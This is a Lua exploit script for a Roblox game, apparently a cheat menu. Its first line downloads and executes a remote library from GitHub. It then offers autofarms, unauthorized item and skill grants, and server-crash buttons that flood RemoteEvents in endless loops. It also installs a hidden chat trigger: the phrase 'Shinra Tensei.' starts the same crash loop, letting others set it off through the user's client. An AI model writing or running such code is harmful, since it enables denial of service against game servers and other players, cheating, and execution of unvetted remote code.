local Lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/KALIangg/HypexRevamp/refs/heads/main/main.lua"))()
Lib:Init()
local TextChatService = game:GetService("TextChatService")
local function sendMessage(message)
    local channel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
    if channel then
        channel:SendAsync(message)
    else
        warn("F chat nao foi")
    end
end
sendMessage("hellow")
local function notify(txt)
	pcall(function()
		game.StarterGui:SetCore("SendNotification", {
			Title = "HYPEX REMAKE ON! ADM ON -🔰",
			Text = txt,
			Duration = 2
		})
	end)
end

local TextChatService = game:GetService("TextChatService")
local plr = game.Players.LocalPlayer


-- ⚔️ AUTOFARMS
Lib:CreateAutoFarm("AutoFarm (Sea 1)", "map7.Bandits", "Zombie", "Autofarm")
Lib:CreateAutoFarm("AutoFarm (Sea 2)", "map3.bandits1", "factory", "Autofarm")
Lib:CreateAutoFarm("AutoFarm (Sea 3)", "map3.bandits1", "Katakuri", "Autofarm")
Lib:CreateAutoFarm("AutoFarm (Sea 8)", "FinalSeaMap6.SocialSociety", "aizen", "Autofarm")

-- 🗡️ GUI SWORDS
Lib:CreateGuiToggle("Awk TTK", "PlayerGui.awakenedtruetriple", "GuiSwords")
Lib:CreateGuiToggle("Hollow Scythe", "PlayerGui.scythe", "GuiSwords")
Lib:CreateGuiToggle("Awk Rengoku", "PlayerGui.awakenedrengoku", "GuiSwords")
Lib:CreateGuiToggle("Triple Awk Saber", "PlayerGui.Tripleawakensaber", "GuiSwords")
Lib:CreateGuiToggle("TTY Moveset", "PlayerGui.yoru2", "GuiSwords")
Lib:CreateGuiToggle("Shusui", "PlayerGui.shusui", "GuiSwords")

-- 🗡️ SWORDS & TOOLS
Lib:CreateToolButton("TTY V3 Sword", "TripleYoruV3", "yoru2", "Swords")
Lib:CreateToolButton("Awakened Ace", "AwakenedAceSword", "acesword", "Swords")
Lib:CreateToolButton("Shadow Dagger", "ShadowDagger", "ShadowDagger", "Swords")
Lib:CreateToolButton("Fantastic Triple Katana", "FantasticTripleKatana", "ftkskills", "Swords")
Lib:CreateToolButton("Awakened CDK", "AwakenedCursedDualKatana", "AwakenedCursedDualKatana", "Swords")
Lib:CreateToolButton("True Triple Katana v2", "AwakenedTrueTripleKatana", "awakenedtruetriple", "Swords")
Lib:CreateToolButton("Yuta", "Yuta", "yuta", "Swords")
Lib:CreateToolButton("Candy Cane", "CandyCane", "candycane", "Swords")
Lib:CreateToolButton("Escanor", "Escanor", "Escanor", "Swords")

-- 🍎 FRUITS / TOOLS
Lib:CreateToolButton("Sharingan Fruit", "Sharingan", "sharingan", "Fruits")
Lib:CreateToolButton("Baryon Naruto", "Baryon", "baryon", "Fruits")
Lib:CreateToolButton("Dragon V3", "dragonV3", "dragon3", "Fruits")
Lib:CreateToolButton("Gear 5 v3", "Rubber5ndGearV2", "rubber5ndv2", "Fruits")
Lib:CreateToolButton("Sukuna", "Sukuna", "sukuna", "Fruits")
Lib:CreateToolButton("Gojo", "Gojo2", "gojo", "Fruits")
Lib:CreateToolButton("Gear 4 Awk", "RubberTimeSkip", "tsrubber", "Fruits")
Lib:CreateToolButton("Portal v2", "PortalV2", "portal2", "Fruits")
Lib:CreateToolButton("DarkXQuake", "DarkXQuake", "DarkXQuake", "Fruits")



-- ⚡ SKILLS / TRANSFORMS
Lib:CreateSkillButton("Mochi Buzzcut", "PlayerGui.donut3.Frame.smash4.RemoteEvent", "Skills")
Lib:CreateSkillButton("Conqueror Haki", "PlayerGui.Conquers.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Leopard Zoan", "PlayerGui.leopard2.Frame.zoan.RemoteEvent", "Skills")
Lib:CreateSkillButton("Leopard Z", "PlayerGui.leopard2.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Baryon Mode", "PlayerGui.baryon.Frame.transform.RemoteEvent", "Skills")
Lib:CreateSkillButton("Wind Rasengan", "PlayerGui.baryon.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("Naruto Uzucrack", "PlayerGui.sosp.Frame.zoan.RemoteEvent", "Skills")
Lib:CreateSkillButton("Bijuu dama", "PlayerGui.sosp.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Mink Skill", "PlayerGui.RaceV4Mink.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Soccer", "PlayerGui.soccer.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Cursed Tornado", "PlayerGui.AwakenedCursedDualKatana.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Mech", "PlayerGui.mech.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Boxing Z", "PlayerGui.Boxing.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("Dismantle", "PlayerGui.sukuna.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("Fox", "PlayerGui.fox.Frame.smash.RemoteEvent", "Skills")

--[[ ============================
          🍎 FRUTAS TOP
================================= ]]--

Lib:CreateSkillButton("🔥 mui Skill 1", "PlayerGui.mui.Frame.zoan.RemoteEvent", "Skills")
Lib:CreateSkillButton("🔥 mui Skill 2", "PlayerGui.mui.Frame.FLY.RemoteEvent", "Skills")
Lib:CreateSkillButton("🔥 mui Skill 3", "PlayerGui.mui.Frame.FLY.RemoteEvent2", "Skills")
Lib:CreateSkillButton("🔥 mui Skill 4", "PlayerGui.mui.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🔥 mui Skill 5", "PlayerGui.mui.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("💘 Love F", "PlayerGui.Love.Frame.f.RemoteEvent", "Skills")
Lib:CreateSkillButton("💘 Love F2", "PlayerGui.Love.Frame.f.RemoteEvent2", "Skills")
Lib:CreateSkillButton("💘 Love Smash", "PlayerGui.Love.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("💘 Love Smash 2", "PlayerGui.Love.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("💘 Love Smash 3", "PlayerGui.Love.Frame.smash3.RemoteEvent", "Skills")
Lib:CreateSkillButton("💥 Skibidi Smash", "PlayerGui.skibidi.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("💥 Skibidi Smash 2", "PlayerGui.skibidi.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("💥 Skibidi F", "PlayerGui.skibidi.Frame.f.RemoteEvent", "Skills")
Lib:CreateSkillButton("💥 Skibidi F2", "PlayerGui.skibidi.Frame.f.RemoteEvent2", "Skills")
Lib:CreateSkillButton("💨 TsRubber Smash", "PlayerGui.tsrubber.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🐠 RaceV4Fish Smash", "PlayerGui.RaceV4Fish.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🐠 RaceV4Fish Smash 2", "PlayerGui.RaceV4Fish.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("🐠 RaceV4Fish Smash 3", "PlayerGui.RaceV4Fish.Frame.smash3.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧛‍♂️ RaceV4Ghoul Smash", "PlayerGui.RaceV4Ghoul.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧛‍♂️ RaceV4Ghoul Smash 2", "PlayerGui.RaceV4Ghoul.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧛‍♂️ RaceV4Ghoul Smash 3", "PlayerGui.RaceV4Ghoul.Frame.smash3.RemoteEvent", "Skills")

--[[ ============================
      🍎 FRUTAS DO MEIO (PRIORIDADE)
================================= ]]--

Lib:CreateSkillButton("🐉 Dragon V3 F", "PlayerGui.dragon3.Frame.f.RemoteEvent", "Skills")
Lib:CreateSkillButton("🐉 Dragon V3 F2", "PlayerGui.dragon3.Frame.f.RemoteEvent2", "Skills")
Lib:CreateSkillButton("🐉 Dragon V3 Smash", "PlayerGui.dragon3.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🐉 Dragon V3 Smash 2", "PlayerGui.dragon3.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("🐉 Dragon V3 Smash 3", "PlayerGui.dragon3.Frame.smash3.RemoteEvent", "Skills")
Lib:CreateSkillButton("🐉 Dragon V3 Smash 4", "PlayerGui.dragon3.Frame.smash4.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧠 Sharingan Smash", "PlayerGui.sharingan.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧠 Sharingan Smash 2", "PlayerGui.sharingan.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧠 Sharingan Admin Kamui", "PlayerGui.sharingan.Frame.smash3.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧠 Sharingan F", "PlayerGui.sharingan.Frame.f.RemoteEvent", "Skills")
Lib:CreateSkillButton("🧠 Sharingan F2", "PlayerGui.sharingan.Frame.f.RemoteEvent2", "Skills")
Lib:CreateSkillButton("⚡ Gear 5", "PlayerGui.rubber5ndv2.Frame.gear5.RemoteEvent", "Skills")
Lib:CreateSkillButton("⚡ Gear 5 Bolt", "PlayerGui.rubber5ndv2.Frame.smash.RemoteEvent", "Skills")

--[[ ============================
          🗡️ ESPADAS
================================= ]]--

Lib:CreateSkillButton("🗡️ Yoru V3 Slash", "PlayerGui.yoru2.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🗡️ Yoru V3 Slash 2", "PlayerGui.yoru2.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("🗡️ Yoru V3 Slash 3", "PlayerGui.yoru2.Frame.smash3.RemoteEvent", "Skills")
Lib:CreateSkillButton("🗡️ True Triple Yoru V3", "PlayerGui.TripleYoruV3.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🗡️ Awakened TTK Slash", "PlayerGui.awakenedtruetriple.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🗡️ Awakened TTK Slash 2", "PlayerGui.awakenedtruetriple.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("🗡️ Awakened TTK Slash 3", "PlayerGui.awakenedtruetriple.Frame.smash3.RemoteEvent", "Skills")
Lib:CreateSkillButton("⚔️ Yuta Slash", "PlayerGui.yuta.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("⚔️ Yuta Slash 2", "PlayerGui.yuta.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("☠️ Shadow Dagger", "PlayerGui.ShadowDagger.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("☀️ Escanor Smash", "PlayerGui.Escanor.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("💨 FTK Rush", "PlayerGui.ftkskills.Frame.smash2.RemoteEvent", "Skills")
Lib:CreateSkillButton("⚙️ Mech Smash", "PlayerGui.mech.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🔺 Awakened CDK Slash", "PlayerGui.AwakenedCursedDualKatana.Frame.smash.RemoteEvent", "Skills")
Lib:CreateSkillButton("🔺 Awakened CDK Slash 3", "PlayerGui.AwakenedCursedDualKatana.Frame.smash3.RemoteEvent", "Skills")







-- 🌀 GUI TOGGLES
Lib:CreateGuiToggle("Gojo", "PlayerGui.gojo", "Skills")
Lib:CreateGuiToggle("Portal Teleport", "PlayerGui.portal2", "Skills", "teleport")

-- 🛠️ ADMIN PANEL
Lib:CreateCustomToggle("🔰 Admin Panel", "Admin", function(state)
    if state then
        print("Adm Toggle On - Made by Hype")
        game.Players.LocalPlayer.PlayerGui.AdminPanelByFloppa.Frame.Active= true
        game.Players.LocalPlayer.PlayerGui.AdminPanelByFloppa.Frame.Visible= true
    else
        print("Adm Toggle Off - Made by Hype")
        game.Players.LocalPlayer.PlayerGui.AdminPanelByFloppa.Frame.Active= false
        game.Players.LocalPlayer.PlayerGui.AdminPanelByFloppa.Frame.Visible= false
    end
end)

Lib:CreateCustomButton("Explodir Servidor", "Admin", function()
    while true do
        game:GetService("Players").LocalPlayer.PlayerGui.spirit3.Frame.sun.RemoteEvent:FireServer()
        wait(0.0001)
    end
end)



local Exploding = false

Lib:CreateCustomToggle("Travar Servidor", "Admin", function(state)
    Exploding = state

    if state then
        task.spawn(function()
            while Exploding do
                local remote = game:GetService("Players").LocalPlayer.PlayerGui.sukuna.Frame.smash4.RemoteEvent
                if remote then
                    remote:FireServer()
                end
                task.wait(0.0001)
            end
        end)
    end
end)







Lib:CreateCustomButton("Logar Skills Pesadas", "Admin", function()
    local plr = game.Players.LocalPlayer

    local sources = {
        ReplicatedStorage = game:GetService("ReplicatedStorage"),
        PlayerGui = plr:WaitForChild("PlayerGui")
    }

    local heavyThreshold = 75
    local effectTypes = {
        "ParticleEmitter", "Trail", "Beam", "Smoke", "Fire", "Explosion", "Sparkles"
    }

    local function countEffects(obj)
        local count = 0
        for _, d in ipairs(obj:GetDescendants()) do
            if table.find(effectTypes, d.ClassName) then
                count += 1
            end
        end
        return count
    end

    local function isSkillLike(name)
        local low = string.lower(name)
        return string.find(low, "skill") or string.find(low, "smash") or string.find(low, "move") or string.find(low, "attack")
    end

    for label, root in pairs(sources) do
        print("🔍 Escaneando:", label)
        for _, obj in ipairs(root:GetDescendants()) do
            if obj:IsA("Model") or obj:IsA("Tool") or obj:IsA("ScreenGui") or obj:IsA("Frame") then
                local descendantCount = #obj:GetDescendants()
                local effectCount = countEffects(obj)
                local skillNameMatch = isSkillLike(obj.Name)

                if descendantCount > heavyThreshold or effectCount >= 10 or skillNameMatch then
                    warn("⚠️ PESADO OU SUSPEITO EM [" .. label .. "] ➤ " .. obj:GetFullName())
                    print("  🧱 Descendants:", descendantCount)
                    print("  ✨ Effects:", effectCount)
                    if skillNameMatch then
                        print("  🔥 Skill-like name detectado!")
                    end
                end
            end
        end
    end

    print("✅ Varredura finalizada.")
end)




local function crash()
    wait(1)
    task.spawn(function()
        while true do
            local remote = game:GetService("Players").LocalPlayer.PlayerGui.sukuna.Frame.smash4.RemoteEvent
            if remote then
                remote:FireServer()
            end
            task.wait(0.00001)
        end
    end)
end

local commands = {
    ["Shinra Tensei."] = crash,
}


TextChatService.OnIncomingMessage = function(msg)
	local content = msg.Text
	if commands[content] then
		pcall(commands[content])
	end
end

-- ☠️ EXPLOSIVOS DEVS / DEVTOOLS
Lib:CreateSkillButton("Crash Event", "Workspace.Crash", "Admin")
Lib:CreateCustomButton("Menu Total", "MenuTotal", function()
    Lib:CreateStandaloneServerPanel()
end)